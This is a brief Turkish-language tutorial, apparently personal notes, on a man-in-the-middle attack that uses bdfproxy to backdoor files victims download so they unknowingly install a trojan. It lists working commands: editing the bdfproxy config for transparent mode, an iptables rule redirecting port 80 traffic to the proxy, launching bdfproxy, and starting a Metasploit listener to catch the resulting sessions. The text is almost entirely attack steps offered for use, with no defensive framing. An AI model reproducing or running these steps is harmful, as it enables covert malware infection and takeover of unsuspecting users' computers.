Bu saldırıyı yapmak için ortadaki adam olmamız lazım.
İnsanlar bir dosya indirirken o dosya içerisine trojanımızı yerleştireceğiz bu sayede insanlar farketmeden trojanımızı indirmiş olacaklar.

leafpad /etc/bdfproxy/bdfproxy.cfg  -> config dosyasını açar.

Aşağıda işletim sistemleri için özellikler var. Hangi sisteme saldıracaksanız onun ayarlarını değiştirmeniz gerekir. 

proxyMode = transparent  -> olmalıdır.


iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080	-> 80'den gelen bağlantıyı 8080'e yönlendiriyoruz.

bdfproxy -> programı çalıştırır.

msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc -> bdfproxy buraya kayıt eder bizde msfconsole ile bu dosyayı dinliyoruz.